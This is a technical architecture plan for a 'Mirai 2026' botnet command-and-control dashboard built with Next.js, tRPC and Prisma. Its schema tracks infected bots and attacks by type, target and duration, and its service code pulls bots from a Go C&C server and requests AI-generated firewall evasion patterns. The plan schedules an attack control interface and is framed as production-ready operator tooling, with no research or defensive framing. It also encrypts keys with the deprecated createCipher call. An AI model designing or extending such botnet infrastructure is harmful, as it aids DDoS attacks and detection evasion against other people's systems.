# Mirai 2026 - C&C Dashboard Technical Architecture
# Full-Stack Implementation Plan

**Version:** 1.0  
**Created:** February 24, 2026  
**Tech Level:** Production-ready, scalable, performant  

---

## 🏗️ Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                     CLIENT (Browser)                         │
│  ┌──────────────────────────────────────────────────────┐   │
│  │          Next.js 14 + React 18 + TypeScript           │   │
│  │  ┌─────────────────────────────────────────────────┐ │   │
│  │  │  UI Layer (Components + Pages)                  │ │   │
│  │  │  - React Three Fiber (3D Globe)                 │ │   │
│  │  │  - Framer Motion (Animations)                   │ │   │
│  │  │  - Tailwind CSS (Styling)                       │ │   │
│  │  └─────────────────────────────────────────────────┘ │   │
│  │  ┌─────────────────────────────────────────────────┐ │   │
│  │  │  State Management (Zustand + React Query)       │ │   │
│  │  └─────────────────────────────────────────────────┘ │   │
│  │  ┌─────────────────────────────────────────────────┐ │   │
│  │  │  API Layer (tRPC + WebSocket)                   │ │   │
│  │  └─────────────────────────────────────────────────┘ │   │
│  └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
                              │
                              │ HTTP/WS
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                     BACKEND (Node.js)                        │
│  ┌──────────────────────────────────────────────────────┐   │
│  │         Next.js API Routes + tRPC Server             │   │
│  │  ┌─────────────────────────────────────────────────┐ │   │
│  │  │  API Layer (REST + tRPC + WebSocket)            │ │   │
│  │  └─────────────────────────────────────────────────┘ │   │
│  │  ┌─────────────────────────────────────────────────┐ │   │
│  │  │  Business Logic (Services)                      │ │   │
│  │  └─────────────────────────────────────────────────┘ │   │
│  │  ┌─────────────────────────────────────────────────┐ │   │
│  │  │  Data Access Layer (Prisma ORM)                 │ │   │
│  │  └─────────────────────────────────────────────────┘ │   │
│  └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
                              │
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                   EXISTING BACKEND (Python + Go)             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │ AI Service   │  │  C&C Server  │  │  PostgreSQL  │      │
│  │ (Flask)      │  │  (Go)        │  │  Database    │      │
│  │ Port 8001    │  │  Port 23,101 │  │  Port 5433   │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │ Prometheus   │  │  Grafana     │  │  Redis       │      │
│  │ Port 9090    │  │  Port 3002   │  │  Port 6380   │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
└─────────────────────────────────────────────────────────────┘
```

---

## 🛠️ Complete Tech Stack

### Frontend Core

**Framework:**
```json
{
  "next": "14.1.0",           // React framework with SSR/SSG
  "react": "18.2.0",          // UI library
  "typescript": "5.3.3"       // Type safety
}
```

**Why Next.js 14:**
- Server Components for optimal performance
- App Router for better routing
- Built-in API routes
- Image optimization
- Static generation + ISR

### UI & Styling

**Component Framework:**
```json
{
  "tailwindcss": "3.4.1",     // Utility-first CSS
  "@headlessui/react": "1.7.18", // Accessible components
  "clsx": "2.1.0",            // Class name utility
  "tailwind-merge": "2.2.1"   // Merge Tailwind classes
}
```

**Icons & Assets:**
```json
{
  "@heroicons/react": "2.1.1", // Icon set
  "lucide-react": "0.323.0",   // Additional icons
  "react-icons": "5.0.1"       // Icon library
}
```

### 3D Visualization

**Three.js Ecosystem:**
```json
{
  "three": "0.161.0",                  // 3D library
  "@react-three/fiber": "8.15.16",     // React renderer for Three.js
  "@react-three/drei": "9.96.0",       // Helpers and abstractions
  "@react-three/postprocessing": "2.16.0", // Effects
  "maath": "0.10.7"                    // Math utilities
}
```

**Features:**
- Interactive 3D globe
- Real-time bot visualization
- Particle systems
- Post-processing effects (bloom, etc.)

### Animations

**Animation Libraries:**
```json
{
  "framer-motion": "11.0.5",   // React animation library
  "gsap": "3.12.5",            // Advanced animations
  "@lottiefiles/react-lottie-player": "3.5.3" // Lottie animations
}
```

**Use Cases:**
- Page transitions
- Micro-interactions
- Loading states
- Scroll animations

### State Management

**Global State:**
```json
{
  "zustand": "4.5.0",          // Lightweight state management
  "@tanstack/react-query": "5.20.5", // Server state
  "immer": "10.0.3"            // Immutable state updates
}
```

**Why Zustand + React Query:**
- Zustand: Simple, minimal boilerplate
- React Query: Caching, refetching, optimistic updates
- Separate concerns: UI state vs server state

### Data Fetching & API

**Type-Safe API:**
```json
{
  "@trpc/server": "10.45.1",   // Type-safe API
  "@trpc/client": "10.45.1",   // Client library
  "@trpc/react-query": "10.45.1", // React Query integration
  "@trpc/next": "10.45.1"      // Next.js adapter
}
```

**HTTP Client:**
```json
{
  "axios": "1.6.7",            // HTTP client
  "ky": "1.2.0"                // Modern fetch wrapper
}
```

### Real-Time Communication

**WebSocket:**
```json
{
  "socket.io-client": "4.6.1", // WebSocket client
  "ws": "8.16.0"               // WebSocket server
}
```

**Use Cases:**
- Live metrics updates
- Real-time logs
- Bot status changes
- Attack progress

### Forms & Validation

**Form Management:**
```json
{
  "react-hook-form": "7.50.0", // Form library
  "zod": "3.22.4",             // Schema validation
  "@hookform/resolvers": "3.3.4" // RHF + Zod integration
}
```

### Data Visualization

**Charts & Graphs:**
```json
{
  "recharts": "2.12.0",        // React charts
  "d3": "7.8.5",               // Data visualization
  "visx": "3.10.0"             // Low-level viz components
}
```

**Specialized:**
```json
{
  "react-terminal": "1.3.1",   // Terminal component
  "xterm": "5.3.0",            // Full terminal emulator
  "react-json-view": "1.21.3"  // JSON viewer
}
```

### Database & ORM

**ORM:**
```json
{
  "prisma": "5.9.1",           // Database ORM
  "@prisma/client": "5.9.1"    // Prisma client
}
```

**Schema Example:**
```prisma
model Bot {
  id        String   @id @default(cuid())
  ip        String   @unique
  location  Json
  status    BotStatus
  lastSeen  DateTime @updatedAt
  attacks   Attack[]
  createdAt DateTime @default(now())
}

model Attack {
  id        String   @id @default(cuid())
  type      AttackType
  target    String
  duration  Int
  status    AttackStatus
  bot       Bot      @relation(fields: [botId], references: [id])
  botId     String
  createdAt DateTime @default(now())
}
```

### Development Tools

**Code Quality:**
```json
{
  "eslint": "8.56.0",          // Linting
  "prettier": "3.2.5",         // Code formatting
  "@typescript-eslint/parser": "6.20.0",
  "@typescript-eslint/eslint-plugin": "6.20.0"
}
```

**Testing:**
```json
{
  "vitest": "1.2.2",           // Test runner
  "@testing-library/react": "14.2.1",
  "@testing-library/jest-dom": "6.4.2",
  "playwright": "1.41.2"       // E2E testing
}
```

**Development:**
```json
{
  "storybook": "7.6.14",       // Component playground
  "turbo": "1.12.4"            // Build system
}
```

### Utilities

**Misc Libraries:**
```json
{
  "date-fns": "3.3.1",         // Date utilities
  "lodash-es": "4.17.21",      // Utility functions
  "nanoid": "5.0.5",           // ID generation
  "react-hot-toast": "2.4.1",  // Notifications
  "react-loading-skeleton": "3.4.0" // Loading skeletons
}
```

---

## 📁 Project Structure

```
mirai-2026-dashboard/
├── .next/                    # Next.js build output
├── public/                   # Static assets
│   ├── images/
│   ├── models/              # 3D models
│   ├── textures/            # Globe textures
│   └── favicon.ico
│
├── src/
│   ├── app/                 # Next.js App Router
│   │   ├── (auth)/         # Auth routes
│   │   │   ├── login/
│   │   │   └── layout.tsx
│   │   ├── (dashboard)/    # Dashboard routes
│   │   │   ├── page.tsx    # Main dashboard
│   │   │   ├── bots/
│   │   │   ├── attacks/
│   │   │   ├── terminal/
│   │   │   ├── analytics/
│   │   │   ├── ai/
│   │   │   ├── logs/
│   │   │   ├── settings/
│   │   │   └── layout.tsx
│   │   ├── api/            # API routes
│   │   │   ├── trpc/[trpc]/route.ts
│   │   │   └── websocket/route.ts
│   │   ├── layout.tsx      # Root layout
│   │   └── page.tsx        # Landing page
│   │
│   ├── components/          # React components
│   │   ├── ui/             # Base UI components
│   │   │   ├── button.tsx
│   │   │   ├── card.tsx
│   │   │   ├── modal.tsx
│   │   │   ├── input.tsx
│   │   │   └── ...
│   │   ├── dashboard/      # Dashboard-specific
│   │   │   ├── Header.tsx
│   │   │   ├── Sidebar.tsx
│   │   │   ├── MetricCard.tsx
│   │   │   └── ...
│   │   ├── globe/          # 3D Globe
│   │   │   ├── NetworkGlobe.tsx
│   │   │   ├── BotMarker.tsx
│   │   │   └── ConnectionLine.tsx
│   │   ├── terminal/       # Terminal
│   │   │   ├── Terminal.tsx
│   │   │   ├── CommandInput.tsx
│   │   │   └── Output.tsx
│   │   └── shared/         # Shared components
│   │
│   ├── hooks/               # Custom React hooks
│   │   ├── useBots.ts
│   │   ├── useAttacks.ts
│   │   ├── useWebSocket.ts
│   │   ├── useMetrics.ts
│   │   └── ...
│   │
│   ├── lib/                 # Utilities
│   │   ├── api/            # API client
│   │   │   ├── trpc.ts
│   │   │   └── websocket.ts
│   │   ├── utils.ts        # Helper functions
│   │   ├── constants.ts    # Constants
│   │   └── validators.ts   # Zod schemas
│   │
│   ├── server/              # Server-side code
│   │   ├── api/            # tRPC routers
│   │   │   ├── root.ts
│   │   │   ├── routers/
│   │   │   │   ├── bots.ts
│   │   │   │   ├── attacks.ts
│   │   │   │   ├── ai.ts
│   │   │   │   └── ...
│   │   │   └── trpc.ts
│   │   ├── db/             # Database
│   │   │   ├── client.ts
│   │   │   └── schema.prisma
│   │   └── services/       # Business logic
│   │       ├── bot.service.ts
│   │       ├── attack.service.ts
│   │       └── ...
│   │
│   ├── stores/              # Zustand stores
│   │   ├── useAuthStore.ts
│   │   ├── useUIStore.ts
│   │   └── ...
│   │
│   ├── styles/              # Global styles
│   │   ├── globals.css
│   │   └── theme.css
│   │
│   └── types/               # TypeScript types
│       ├── api.ts
│       ├── models.ts
│       └── ...
│
├── prisma/                  # Prisma schema
│   ├── schema.prisma
│   └── migrations/
│
├── tests/                   # Tests
│   ├── unit/
│   ├── integration/
│   └── e2e/
│
├── .storybook/              # Storybook config
├── .env.local               # Environment variables
├── .env.example
├── next.config.js
├── tailwind.config.ts
├── tsconfig.json
├── package.json
└── README.md
```

---

## 🔌 API Integration Architecture

### tRPC Router Structure

```typescript
// src/server/api/root.ts
import { createTRPCRouter } from './trpc';
import { botsRouter } from './routers/bots';
import { attacksRouter } from './routers/attacks';
import { aiRouter } from './routers/ai';
import { metricsRouter } from './routers/metrics';

export const appRouter = createTRPCRouter({
  bots: botsRouter,
  attacks: attacksRouter,
  ai: aiRouter,
  metrics: metricsRouter,
});

export type AppRouter = typeof appRouter;
```

### Example Router (Bots)

```typescript
// src/server/api/routers/bots.ts
import { z } from 'zod';
import { createTRPCRouter, protectedProcedure } from '../trpc';

export const botsRouter = createTRPCRouter({
  list: protectedProcedure
    .input(z.object({
      page: z.number().default(1),
      limit: z.number().default(50),
      status: z.enum(['online', 'offline', 'all']).default('all'),
    }))
    .query(async ({ ctx, input }) => {
      const bots = await ctx.db.bot.findMany({
        where: input.status !== 'all' ? { status: input.status } : {},
        skip: (input.page - 1) * input.limit,
        take: input.limit,
        orderBy: { lastSeen: 'desc' },
      });
      
      const total = await ctx.db.bot.count();
      
      return {
        bots,
        total,
        page: input.page,
        totalPages: Math.ceil(total / input.limit),
      };
    }),
  
  getById: protectedProcedure
    .input(z.object({ id: z.string() }))
    .query(async ({ ctx, input }) => {
      return ctx.db.bot.findUnique({
        where: { id: input.id },
        include: { attacks: true },
      });
    }),
  
  remove: protectedProcedure
    .input(z.object({ id: z.string() }))
    .mutation(async ({ ctx, input }) => {
      return ctx.db.bot.delete({
        where: { id: input.id },
      });
    }),
});
```

### WebSocket Integration

```typescript
// src/lib/api/websocket.ts
import io, { Socket } from 'socket.io-client';

export class WebSocketClient {
  private socket: Socket | null = null;
  
  connect(url: string) {
    this.socket = io(url, {
      transports: ['websocket'],
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000,
    });
    
    this.socket.on('connect', () => {
      console.log('WebSocket connected');
    });
    
    this.socket.on('disconnect', () => {
      console.log('WebSocket disconnected');
    });
    
    return this.socket;
  }
  
  subscribe(event: string, callback: (data: any) => void) {
    this.socket?.on(event, callback);
  }
  
  emit(event: string, data: any) {
    this.socket?.emit(event, data);
  }
  
  disconnect() {
    this.socket?.disconnect();
  }
}
```

### Integration with Existing Backend

```typescript
// src/server/services/bot.service.ts
import axios from 'axios';

const AI_SERVICE_URL = process.env.AI_SERVICE_URL || 'http://localhost:8001';
const CNC_API_URL = process.env.CNC_API_URL || 'http://localhost:8101';

export class BotService {
  // Fetch bots from Go C&C server
  async getBotsFromCNC() {
    const response = await axios.get(`${CNC_API_URL}/api/bots`);
    return response.data;
  }
  
  // Get AI-generated patterns
  async getEvasionPattern() {
    const response = await axios.post(`${AI_SERVICE_URL}/api/pattern/evolve`, {
      detection_feedback: [],
      target_system: 'firewall',
    });
    return response.data;
  }
  
  // Sync with database
  async syncBots() {
    const cncBots = await this.getBotsFromCNC();
    
    // Update database
    for (const bot of cncBots) {
      await prisma.bot.upsert({
        where: { ip: bot.ip },
        update: { status: bot.status, lastSeen: new Date() },
        create: {
          ip: bot.ip,
          location: bot.location,
          status: bot.status,
        },
      });
    }
  }
}
```

---

## 🚀 Performance Optimizations

### Code Splitting

```typescript
// Dynamic imports for heavy components
const NetworkGlobe = dynamic(() => import('@/components/globe/NetworkGlobe'), {
  ssr: false,
  loading: () => <GlobeLoader />,
});

const Terminal = dynamic(() => import('@/components/terminal/Terminal'), {
  ssr: false,
});
```

### Image Optimization

```typescript
import Image from 'next/image';

<Image
  src="/images/bot-icon.png"
  alt="Bot"
  width={32}
  height={32}
  priority
/>
```

### API Caching

```typescript
// React Query caching
const { data: bots } = api.bots.list.useQuery(
  { page: 1, limit: 50 },
  {
    staleTime: 5000,      // 5 seconds
    cacheTime: 60000,     // 1 minute
    refetchOnMount: false,
    refetchOnWindowFocus: false,
  }
);
```

### Bundle Optimization

```javascript
// next.config.js
module.exports = {
  experimental: {
    optimizePackageImports: ['three', 'framer-motion'],
  },
  webpack: (config) => {
    config.optimization.splitChunks = {
      chunks: 'all',
      cacheGroups: {
        three: {
          test: /[\\/]node_modules[\\/](three|@react-three)[\\/]/,
          name: 'three',
          priority: 10,
        },
      },
    };
    return config;
  },
};
```

---

## 🔐 Security Considerations

### Authentication

```typescript
// JWT + Session-based auth
import { getServerSession } from 'next-auth';
import { authOptions } from '@/server/auth';

export const protectedProcedure = publicProcedure.use(async ({ ctx, next }) => {
  const session = await getServerSession(authOptions);
  
  if (!session || !session.user) {
    throw new TRPCError({ code: 'UNAUTHORIZED' });
  }
  
  return next({
    ctx: {
      ...ctx,
      session,
      user: session.user,
    },
  });
});
```

### API Key Management

```typescript
// Encrypted storage
import crypto from 'crypto';

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY!;

export function encryptAPIKey(apiKey: string): string {
  const cipher = crypto.createCipher('aes-256-cbc', ENCRYPTION_KEY);
  let encrypted = cipher.update(apiKey, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}
```

### CSP Headers

```javascript
// next.config.js
const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:;
  font-src 'self';
  connect-src 'self' ws: wss:;
`;

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: ContentSecurityPolicy.replace(/\s{2,}/g, ' ').trim(),
          },
        ],
      },
    ];
  },
};
```

---

## 📊 Monitoring & Analytics

### Performance Monitoring

```typescript
// src/lib/analytics.ts
import { Analytics } from '@vercel/analytics/react';
import { SpeedInsights } from '@vercel/speed-insights/next';

// Web Vitals tracking
export function reportWebVitals(metric: any) {
  console.log(metric);
  
  // Send to analytics service
  if (process.env.NODE_ENV === 'production') {
    // Track CLS, FID, FCP, LCP, TTFB
    sendToAnalytics(metric);
  }
}
```

### Error Tracking

```typescript
// Sentry integration
import * as Sentry from '@sentry/nextjs';

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
  tracesSampleRate: 1.0,
});
```

---

## 🧪 Testing Strategy

### Unit Tests (Vitest)

```typescript
// src/components/ui/button.test.tsx
import { render, screen } from '@testing-library/react';
import { Button } from './button';

describe('Button', () => {
  it('renders correctly', () => {
    render(<Button>Click me</Button>);
    expect(screen.getByText('Click me')).toBeInTheDocument();
  });
  
  it('handles click events', async () => {
    const handleClick = vi.fn();
    render(<Button onClick={handleClick}>Click me</Button>);
    
    await userEvent.click(screen.getByText('Click me'));
    expect(handleClick).toHaveBeenCalledOnce();
  });
});
```

### E2E Tests (Playwright)

```typescript
// tests/e2e/dashboard.spec.ts
import { test, expect } from '@playwright/test';

test('dashboard loads and displays metrics', async ({ page }) => {
  await page.goto('http://localhost:3000/dashboard');
  
  // Check header
  await expect(page.locator('h1')).toContainText('Dashboard');
  
  // Check metrics cards
  const metrics = page.locator('[data-testid="metric-card"]');
  await expect(metrics).toHaveCount(4);
  
  // Check 3D globe renders
  await expect(page.locator('canvas')).toBeVisible();
});
```

---

## 📦 Deployment

### Docker

```dockerfile
# Dockerfile
FROM node:20-alpine AS base

# Dependencies
FROM base AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci

# Builder
FROM base AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
RUN npm run build

# Runner
FROM base AS runner
WORKDIR /app

ENV NODE_ENV=production

COPY --from=builder /app/public ./public
COPY --from=builder /app/.next/standalone ./
COPY --from=builder /app/.next/static ./.next/static

EXPOSE 3000
ENV PORT 3000

CMD ["node", "server.js"]
```

### Environment Variables

```bash
# .env.example
# Database
DATABASE_URL="postgresql://user:password@localhost:5432/mirai"

# Authentication
NEXTAUTH_SECRET="your-secret-here"
NEXTAUTH_URL="http://localhost:3000"

# APIs
AI_SERVICE_URL="http://localhost:8001"
CNC_API_URL="http://localhost:8101"
PROMETHEUS_URL="http://localhost:9090"
GRAFANA_URL="http://localhost:3002"

# WebSocket
WS_URL="ws://localhost:3000"

# Analytics
SENTRY_DSN="your-sentry-dsn"
VERCEL_ANALYTICS_ID="your-analytics-id"
```

---

## 🎯 Implementation Timeline

### Week 1: Foundation
- Set up Next.js project
- Configure Tailwind + TypeScript
- Create base UI components
- Set up tRPC + Prisma
- Design system implementation

### Week 2: Core Features
- Dashboard layout
- 3D Network Globe
- Bot management UI
- Terminal component
- WebSocket integration

### Week 3: Advanced Features
- Attack control interface
- Real-time updates
- Analytics dashboards
- AI model controls
- Logs viewer

### Week 4: Polish & Deploy
- Animations and transitions
- Performance optimization
- Testing (unit + e2e)
- Accessibility audit
- Production deployment

---

**Last Updated:** February 24, 2026  
**Version:** 1.0 - Technical Architecture Specification
